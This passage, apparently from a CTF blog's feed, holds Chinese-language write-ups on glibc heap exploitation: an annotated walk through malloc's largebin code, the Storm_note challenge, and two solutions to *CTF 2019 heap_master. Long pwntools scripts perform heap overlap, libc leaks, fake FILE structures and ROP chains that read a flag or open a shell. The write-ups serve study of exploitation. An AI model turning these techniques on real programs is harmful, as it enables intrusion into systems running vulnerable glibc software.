p.recvuntil('Chunk[1]: ') libc_base = u64(p.recvline().strip('\n')) - 88 - 0x3c4b20 print hex(libc_base) free_hook = libc_base + libc.symbols['__free_hook'] getshell = one_gadgets[2]+libc_base payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(free_hook) + p64(8) edit(0,payload) edit(1,p64(getshell)) delete(3) p.interactive()exp()]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[largebin_attack-glibc2.23]]></title>
    <url>%2F2020%2F08%2F01%2Flargebin-attack-glibc2-23%2F</url>
    <content type="text"><![CDATA[unsortedbin 拆分smallbin和largebin：把largebin放入large bin list里面的话得先解链，和unlink其实差不多，不过这里用到了nextsize glibc2.23 malloc/malloc.c:3470 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) //遍历unsortedbin_list &#123; bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) //chunk大小不能小于等于2*SIZE_SZ，不能超过分配区总的内存分配量 malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* place chunk in bin */ if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125;//chunk 属于smallbin的获得相应的index，当前chunk插入到fwd和bck之间 else &#123;//largebin和上面一样 victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123;//largebin中有空闲chunk /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;//如果当前chunk的size小于最后一个的size则插到链表最后 fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123;//正向找第一个chunk大小小于等于当前chunk fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* Always insert in the second position. */ fwd = fwd-&gt;fd; //如果找到和当前chunk的size一样的chunk，当前chunk插入到fwd之后 else &#123;//如果当前size还没有别的chunk，则成为chunk size的代表 victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; //fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控 fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //第一次任意地址写入unsorted bin chunk的地址 &#125; bck = fwd-&gt;bk; &#125; &#125; else //largebin中没有chunk，直接将chunk写入chunksize链表 victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; //第二次任意地址写入unsorted bin chunk的地址 //将chunk插入到largeb bin中，将large bin所对应binmap的相应bit位置#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) //遍历最多10000遍 break; &#125; house of strom利用：我们要构造unsorted bin 里面有一个large bin chunk未被分配进入large bin ，large bin 里也有一个chunk，保证unsorted bin里的那个large bin chunk的size要比large bin里已有的这个chunk的size要大一点，但是都属于同一个index。（large bin 里的index分配跨度的0x3f，eg: 0x4c0-0x4ff;0x500-0x53f） 我们可以利用堆溢出改掉一个原本在largebin列表内的chunk的bk和bk_nextsize，指向我们的目的地址 bk指向的位置+0x10的位置（fd）填入当前chunk的地址，bk_nextsize指向的位置+0x20的位置（fd_nextsize）填入当前chunk地址 eg: 123chunk1 : 0x000400 addr:0x000818 : 0x000400bk: 0x000808 -----------------&gt; 0x000820 : 0x000400bk_nextsize:0x000800 例题：西湖论剑 Storm_note漏洞：off by null利用：large bin attack、overlap（没有show本能是IO_FILE的，但是零字节溢出会覆盖部分地址，就打消了这个念头 init_proc 函数： 1234567891011121314151617181920ssize_t init_proc()&#123; ssize_t result; // rax int fd; // [rsp+Ch] [rbp-4h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); if ( !mallopt(1, 0) ) exit(-1); if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 2882338816LL ) exit(-1); fd = open("/dev/urandom", 0); if ( fd &lt; 0 ) exit(-1); result = read(fd, 0xABCD0100LL, 0x30uLL); if ( result != 48 ) exit(-1); return result;&#125; 12int mallopt(int param,int value) ：M_MXFAST:定义使用fastbins的内存请求大小的上限( param=1，相当于被禁，即free完之后不入fastbin list 后门函数： 123456789101112void __noreturn backdoor()&#123; char buf; // [rsp+0h] [rbp-40h] unsigned __int64 v1; // [rsp+38h] [rbp-8h] v1 = __readfsqword(0x28u); puts("If you can open the lock, I will let you in"); read(0, &amp;buf, 0x30uLL); if ( !memcmp(&amp;buf, 0xABCD0100LL, 0x30uLL) ) system("/bin/sh"); exit(0);&#125; 即 输入=随机数 就能触发后门 alloc 函数： 123456789101112131415161718192021222324252627282930unsigned __int64 alloc_note()&#123; int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i ) ; if ( i == 16 ) &#123; puts("full!"); &#125; else &#123; puts("size ?"); _isoc99_scanf("%d", &amp;v1); if ( v1 &gt; 0 &amp;&amp; v1 &lt;= 0xFFFFF ) &#123; note[i] = calloc(v1, 1uLL); note_size[i] = v1; puts("Done"); &#125; else &#123; puts("Invalid size"); &#125; &#125; return __readfsqword(0x28u) ^ v3;&#125; edit 函数 （off by null)： 12345678910111213141516171819202122unsigned __int64 edit_note()&#123; int v1; // [rsp+0h] [rbp-10h] int v2; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); puts("Index ?"); _isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; note[v1] ) &#123; puts("Content: "); v2 = read(0, note[v1], note_size[v1]); *(note[v1] + v2) = 0; //off by null puts("Done"); &#125; else &#123; puts("Invalid index"); &#125; return __readfsqword(0x28u) ^ v3;&#125; delete 函数： 1234567891011121314151617181920unsigned __int64 delete_note()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Index ?"); _isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; note[v1] ) &#123; free(note[v1]); note[v1] = 0LL; note_size[v1] = 0; &#125; else &#123; puts("Invalid index"); &#125; return __readfsqword(0x28u) ^ v2;&#125; 分析：123456789101112overlap：dele(1) #此刻chunk_list里面只有chunk1的位置是空缺的edit(0,'a'*0x18)#off by nulladd(0x18)#1add(0x4d8)#7 0x050 --&gt;chunk2dele(1)dele(2) #overlap 把0x18大小的chunk free掉了，空了一个位置，并且和前面堆块合并#recoveradd(0x30)#1add(0x4e0)#2 实现chunk2和chunk7堆块重叠 后面chunk8那个的实现也差不多的 large bin attack: 123456789target= 0xabcd0100fake_chunk = target- 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk) # bk --&gt;构造fackchunk的fdedit(7,payload) 1234payload2 = p64(0)*4 + p64(0) + p64(0x4e1) payload2 += p64(0) + p64(fake_chunk+8) #理应写入下一个chunk的fd处，但是刚好借助位置可以写入fakechunk的bk处，防止程序crashpayload2 += p64(0) + p64(fake_chunk-0x18-5) #target chunk fake size 一定要0x56edit(8,payload2) 再次malloc之后，chunk7从unsorted bin到large bin chunk8的fd指向chunk7，chunk7剩余部分存入unsorted bin ，因为堆块重叠，chunk2是large bin，且早被free了，所以chunk2被存入large bin exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')def add(size): p.recvuntil('Choice') p.sendline('1') p.recvuntil('?') p.sendline(str(size))def edit(idx,message): p.recvuntil('Choice') p.sendline('2') p.recvuntil('?') p.sendline(str(idx)) p.recvuntil('Content') p.send(message)def delete(idx): p.recvuntil('Choice') p.sendline('3') p.recvuntil('?') p.sendline(str(idx))add(0x18) #0add(0x508) #1 400+覆盖之后太小了add(0x18) #2 --&gt; 可以删掉它，更新chunk list然后达到overlap的目的edit(1,'a'*0x4f0+p64(0x500))add(0x18) #3add(0x508) #4add(0x18) #5edit(4,'a'*0x4f0+p64(0x500))add(0x18)delete(1)edit(0,'a'*0x18)add(0x18) #1add(0x4d8) #7delete(1)delete(2)add(0x30) #1add(0x4e0) #2delete(4)edit(3,'a'*0x18)add(0x18)#4add(0x4d8)#8delete(4)delete(5)# free -&gt;chunk5 but chunk8 hereadd(0x40)delete(2) #构造一个largebin 一个unsortedbinadd(0x4e8) #chunk5-&gt;largebin delete(2) #chunk2-&gt;unsortedbingdb.attach(p)#largebin attacktarget = 0xabcd0100fakechunk = target-0x20payload = p64(0)*3 + p64(0x4f1) + p64(0) + p64(fakechunk)# bk fackchunk-&gt;fdedit(7,payload)payload2 = p64(0)*4 + p64(0) + p64(0x4e1) payload2 += p64(0) + p64(fakechunk+8) #bk --&gt;fakechunk-&gt;bkpayload2 += p64(0) + p64(fakechunk-0x18-5)#size 0x56edit(8,payload2)add(0x40)payload = p64(0) * 2+p64(0) * 6edit(2,payload)p.sendlineafter('Choice: ','666')p.send(p64(0)*6)p.interactive() 为什么size不能是0x55呢？0x55&amp;0x2=0（绕不过check）0x56&amp;0x2=2 （图片from：https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/ ） 参考链接：https://bbs.pediy.com/thread-254849.htmhttp://blog.eonew.cn/archives/709 2019 *CTF heap_master这真是折磨死我的一道题啊，还有几种方法后续补吧 这道题确实挺有趣的，因为malloc的堆块和edit的free操作对应的堆块位置不同edit和free的操作对象是mmap分配的地址段然后它也没有show函数，所以就本能会想到IO_FILE的leak操作 方法一：global_max_fast+unsortedbin attack+IO_flash_all_lockp:参考blog: https://shift-crops.hatenablog.com/entry/2019/04/30/131154#heap-master-Pwn-740pt-8-solves global_max_fast： 关于开头的global_max_fast的使用，其实不是很明白，后来试了试别的地址，发现不改global_max_fast的值，就会报错溢出，至于为啥还是不是很懂–后续–fastbin free完之后是不用在next chunk的prev_size位赋值的，所以这题free 0xf1大小的堆块理应是有prev_size位的，但是他没有所以会报错。 其他chunk free完是会有的 好的，global_max_fast改值之后就可以用fastbin操作了（uaf等，uaf是主要），基本上我们要控制stdou的内容的话，用的最多的方法就是uaf、largebin attack， UAF：同一段chunk，用溢出改写chunk的size位，构造出不同size的free chunk，然后通过溢出修改free chunk的fd，再malloc两次就可以达到任意地址写了（size与构造的fake chunk的size要一致） 这题的话吧，因为malloc的堆不可用bk指针改成global_max_fast，malloc 之后就是把global的值赋值成了main_arena,然后main_arena里面写入global的值 1234567891011121314151617181920212223pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall [corrupted]FD: 0x57af5000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x57af5000BK: 0x7ffff7dd37e8 (free_list) ◂— 0x0smallbinsemptylargebinsemptypwndbg&gt; x/10gx 0x7ffff7dd1b78 0x7ffff7dd1b78 &lt;main_arena+88&gt;: 0x0000555555757020 0x00000000000000000x7ffff7dd1b88 &lt;main_arena+104&gt;: 0x0000000057af5000 0x00007ffff7dd37e80x7ffff7dd1b98 &lt;main_arena+120&gt;: 0x00007ffff7dd1b88 0x00007ffff7dd1b880x7ffff7dd1ba8 &lt;main_arena+136&gt;: 0x00007ffff7dd1b98 0x00007ffff7dd1b980x7ffff7dd1bb8 &lt;main_arena+152&gt;: 0x00007ffff7dd1ba8 0x00007ffff7dd1ba8 改chunk_size，为0xf1，是为了free之后进入main_arena 的位置是在main_arena+e*8的上再free一次，(free的是mmap段），让main_arena段的fd和bk都同时指向mmap（恢复未被unsorted bin attack之前的状态） 再将bk写入stdout的低字节，malloc更改IO_read_end 的地址为main_arena+88又按照上面恢复，继续往bk里面写入stdout+0x10的低字节，malloc将IO_write_base的地址也改成了main_arena+88(write_base=read_end效果等效于flag位改成0xfbad1800)然后我们就可以leak出来了 触发IO_flush_all_lockp： 接着就开始构造getshell的办法了，这里用的是触发IO_flush_all_lockp，读取数据到栈上，最终实现实现rop step1:构造fake FILE结构：让stdout指向main_arena，再通过edit size把main_arena+88+0x68的位置上填上mmap的地址(stderr被改成mmap段)step2:在mmap段上_IO_str_overflow伪造劫持控制流： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//glibc-2.24 /libio/strops.cint _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) //pass return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ //pass return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; //这里写上"/bin/sh" if (new_size &lt; old_blen) //pass return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); //这里写上system的地址 if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125; 绕过检测满足的条件有： 123451.fp-&gt;_flags &amp; _IO_NO_WRITES为假2.pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only为真，即(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base + flush_only3.fp-&gt;_flags &amp; _IO_USER_BUF为假4._IO_size_t new_size = 2 * old_blen + 100 指向"/bin/sh"5.(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)指向system的地址 new_size是放调用函数的参数的地方 所以我们构造四个地方： 1234IO_write_ptr : 0xffffffffffff (&gt;IO_buf_end)IO_buf_end : (参数存放地址-0x64)/2，比如system('/bin/sh'),存放参数的地址就是/bin/sh的地址vtable : _IO_str_jumpsfp-&gt;_s._allocate_buffer（vtable+0x8，偏移是0xe0） : 调用函数的地址 所以在exit的时候调用IO_flush_all_lockp会遍历IO_list_all的全部结点找到合适的去执行IO_overflow,_IO_str_jumps-&gt;_IO_str_overflow,脚本里是用了gets，把rop输入到栈上，然后用ret填满，最后执行rop exp：大佬的脚本模板项目：https://github.com/shift-crops/sc_expwn 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#coding=utf8from sc_expwn import *context.log_level = 'debug'context(arch='amd64', os='linux')context.terminal = ['tmux','splitw','-h']p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def malloc(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size)) # else: # self.sendline('1') # self.sendline(str(size))def malloc_(size): p.sendline('1') p.sendline(str(size))def edit(offset,content): # if self.wait: p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) # else: # self.sendline('2') # self.sendline(str(offset)) # self.sendline(str(len(content))) # self.send(content)def edit_(offset,content): p.sendline('2') p.sendline(str(offset)) p.sendline(str(len(content))) p.send(content)def free(offset): # if self.wait: p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset)) # else: # self.sendline('3') # self.sendline(str(offset))def free_(offset): p.sendline('3') p.sendline(str(offset)) libc_guess = 0x7ffff7a0d000offset_libc_free_hook= libc_guess +libc.symbols['__free_hook'] print hex(offset_libc_free_hook)offset_max_fast = offset_libc_free_hook +0x50# offset_max_fast=libc_guess+libc.symbols['global_max_fast']offset_libc_stdout=libc_guess+libc.symbols['_IO_2_1_stdout_']edit(0x8,p64(0x91)) #0edit(0x98, p64(0x21)) #1edit(0xb8, p64(0x21)) #2free(0x10) # gdb.attach(proc.pidof(p)[0])edit(0x18, p16((offset_max_fast-0x10)&amp;0xffff))malloc(0x80)#global_max_fast 赋值# gdb.attach(proc.pidof(p)[0])edit(0x8, p64(0xf1))edit(0xf8, p64(0x11)) free(0x10)edit(0x8, p64(0x91))# gdb.attach(p)edit(0x18, p16((offset_libc_stdout+0x10-0x10)&amp;0xffff)) #read_endmalloc(0x88)edit_(0x8, p64(0xf1))free_(0x10)edit_(0x8, p64(0x91))# gdb.attach(proc.pidof(p)[0])edit_(0x18, p16((offset_libc_stdout+0x20-0x10)&amp;0xffff)) #write_basemalloc_(0x88)heap_addr = u64(p.recv(8).ljust(8,'\x00'))-0x20print hex(heap_addr)fake = u64(p.recv(8).ljust(8,'\x00'))print hex(fake)addr_buf_base = u64(p.recv(8).ljust(8,'\x00'))print hex(addr_buf_base)libc_addr = u64(p.recv(8).ljust(8,'\x00'))-16 - libc.symbols['_IO_2_1_stdout_']print hex(libc_addr)p.recv(0x838)addr_stack= u64(p.recv(8).ljust(8,'\x00'))-0x3print hex(addr_stack)libc.address=libc_addraddr_libc_gets = libc.sep_function['gets']addr_libc_stdout = libc.symbols['_IO_2_1_stdout_']addr_libc_dl_open_hook = libc.symbols['_dl_open_hook']addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']addr_libc_io_str_jumps = addr_libc_io_file_jumps + 0xc0gdb.attach(proc.pidof(p)[0])edit(0x8, p64(0xf1)) free(0x10) #free完后，fd&amp;bk-&gt;dl_open_hookedit(0x8, p64(0x91))edit(0x18, p64(addr_libc_stdout+0x68-0x10))# bk-&gt;stdout+0x68(chain)malloc(0x88)edit(0x8, p64(0x191))edit(0x198, p64(0x11)) #main_arena + 0x68（chain)-&gt;mmapfree(0x10)fake_file = '\x00'*0x28# fake_file += p64((addr_stack-0x2000 - 0x64)/2 + 1)fake_file += p64(0xffffffffffffffff)fake_file = fake_file.ljust(0x40, '\x00')fake_file += p64((addr_stack -0x2100- 0x64)/2)fake_file = fake_file.ljust(0xd8, '\x00')fake_file += p64(addr_libc_io_str_jumps)fake_file += p64(addr_libc_gets)edit(0, fake_file)gdb.attach(proc.pidof(p)[0])rop = ROP(libc)edit(0x100, './flag\x00')rop.open(addr_buf_base + 0x100, 0)rop.read(3, addr_buf_base + 0x200, 0x100)rop.write(constants.STDOUT_FILENO, addr_buf_base + 0x200, 0x100)print hex(rop.ret.address)p.sendlineafter('&gt;&gt; ', '0')p.sendline(p64(rop.ret.address)*0x500+str(rop))#任意填充一直ret到rop的位置p.interactive() 方法二：largebin attack &amp; dl_open_hook发现它要getshell貌似一定要改glibc的版本，因为给的libc是2.25的 本来想用unsorted bin attack + global_max_fast来做的，但是发现fastbin attack的话好像就没办法把mmap的地址填进dl_open_hook达到对mmap段的利用（我太菜了 那就用largebin attack吧，方便一点 参考链接https://ama2in9.top/2020/01/02/heap_master/https://www.lyyl.online/2020/07/14/starctf-2019-WP/http://pollux.cc/2019/05/04/2019-sixstarsCTF-heap_master/#0x01-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90https://paper.seebug.org/935/#3-largebin-attack-_dl_open_hook 关于dl_open_hook12345678//glibc 2.23 elf/dl-libc.c : 111struct dl_open_hook&#123; void *(*dlopen_mode) (const char *name, int mode); void *(*dlsym) (void *map, const char *name); int (*dlclose) (void *map);&#125;; 我们调试的时候可以发现，在报错时会把dl_open_hook里的值放进rax中（用官方的libc环境是rbx,但是我没更换到）所以要找到可利用的gadget，例如： 120x7ffff7a7a99a &lt;_IO_new_fgetpos+170&gt;: mov rdi,rax0x7ffff7a7a99d &lt;_IO_new_fgetpos+173&gt;: call QWORD PTR [rax+0x20] 基本上就是rax那些指针的bug的感觉了，syscall好像call不了，不知道为啥 然后在rax(mmap段地址在执行libc_dlopen_mode的时候会被放到rax里面）+0x20的位置放setcontext+53的地址 12345670x7ffff7a54b85 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]0x7ffff7a54b8c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]0x7ffff7a54b93 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]0x7ffff7a54b97 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]0x7ffff7a54b9b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]0x7ffff7a54b9f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]0x7ffff7a54ba3 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 控制rsp为我们填写rop的位置，实现rop的利用 调试exp(就是syscall会crash掉，不知道为啥) exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154from pwn import *elf = ELF('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context.log_level = 'debug'def add(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def edit(off,cont): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(off)) p.sendlineafter('size: ', str(len(cont))) p.sendafter('content: ', cont)def delete(off): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(off))def exp(): edit(0x108,p64(0x401)) #fake first large chunk edit(0x508,p64(0x21)) edit(0x528,p64(0x21)) delete(0x110) add(0x400) edit(0x608,p64(0x411)) edit(0x608+0x410,p64(0x21)) edit(0x608+0x430,p64(0x21)) delete(0x610 ) edit(0x118,p16(0x2610)) #modify stdout_flag --&gt; mmap_addr edit(0x128,p16(0x2629)) # delete(0x610) add(0x410) # gdb.attach(p) edit(0x1008,p64(0x451)) #fake second large chunk edit(0x1458,p64(0x21)) edit(0x1478,p64(0x21)) delete(0x1010) add(0x450) edit(0x1508,p64(0x461)) edit(0x1968,p64(0x21)) edit(0x1988,p64(0x21)) delete(0x1510) edit(0x1018,p16(0x2629)) #modify io_write_base_one_byte --&gt; '\x00' add(0x460) data = p.recv(8,timeout=1) if data == '' or data[0] == '=' : raise NameError else : pass p.recv(24) data1 = u64(p.recv(8)) data2 = u64(p.recv(6).ljust(8,'\x00')) heap_base = data1 - 3584 libc_base = data2 - 3954339 setcontext = libc_base + 293749 print hex(heap_base),hex(libc_base) edit(0x2008,p64(0x501)) edit(0x2508,p64(0x21)) edit(0x2528,p64(0x21)) delete(0x2010) add(0x500) edit(0x2608,p64(0x511)) edit(0x2b18,p64(0x21)) edit(0x2b38,p64(0x21)) delete(0x2610) edit(0x2018,p16(0x62d0)) add(0x510) #gdb.attach(p) pop_rax = libc_base + 0x000000000003a738 pop_rdi = libc_base + 0x0000000000021112 pop_rsi = libc_base + 0x00000000000202f8 #182c pop_rdx = libc_base + 0x0000000000001b92 #true syscall = libc_base + 0x00000000000026bf # 0x7ffff7a7a99a &lt;_IO_new_fgetpos+170&gt;: mov rdi,rax # 0x7ffff7a7a99d &lt;_IO_new_fgetpos+173&gt;: call QWORD PTR [rax+0x20] edit(0x2600,p64(libc_base+0x6D99A)) edit(0x2620,p64(setcontext+0x10)) edit(0x26a0,p64(heap_base+0x26b0)) edit(0x26a8,p64(libc_base+0x0000000000000937)) #ret edit(0x26b0,p64(pop_rax)) #read edit(0x26b8,p64(0)) edit(0x26c0,p64(pop_rdi)) edit(0x26c8,p64(0)) edit(0x26d0,p64(pop_rsi)) edit(0x26d8,p64(heap_base)) edit(0x26e0,p64(pop_rdx)) edit(0x26e8,p64(20)) edit(0x26f0,p64(syscall)) edit(0x26f8,p64(pop_rax)) #open edit(0x2700,p64(2)) edit(0x2708,p64(pop_rdi)) edit(0x2710,p64(heap_base)) edit(0x2718,p64(pop_rsi)) edit(0x2720,p64(0)) edit(0x2728,p64(pop_rdx)) edit(0x2730,p64(0)) edit(0x2738,p64(syscall)) edit(0x2740,p64(pop_rax)) #read edit(0x2748,p64(0)) edit(0x2750,p64(pop_rdi)) edit(0x2758,p64(4)) edit(0x2760,p64(pop_rsi)) edit(0x2768,p64(heap_base)) edit(0x2770,p64(pop_rdx)) edit(0x2778,p64(0x20)) edit(0x2780,p64(syscall)) edit(0x2788,p64(pop_rax)) #write edit(0x2790,p64(1)) edit(0x2798,p64(pop_rdi)) edit(0x27a0,p64(1)) edit(0x27a8,p64(pop_rsi)) edit(0x27b0,p64(heap_base)) edit(0x27b8,p64(pop_rdx)) edit(0x27c0,p64(0x20)) edit(0x27c8,p64(syscall)) delete(0x2b20) gdb.attach(p) delete(0x2b20) p.send('./flag\x00') p.interactive()if __name__ == '__main__' : pd = 1 while pd: try : p = process('./heap_master') exp() pd = 0 except Exception as e: print e p.close() pass 打得通的大佬exp(就是由于要搞glibc的更换，所以没办法在gdb里看bin那些东西)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#coding=utf-8from pwn import *context.update(arch='amd64',os='linux',log_level='DEBUG')context.terminal = ['tmux','split','-h']debug = 2libc_offset = 0x3c4b20gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 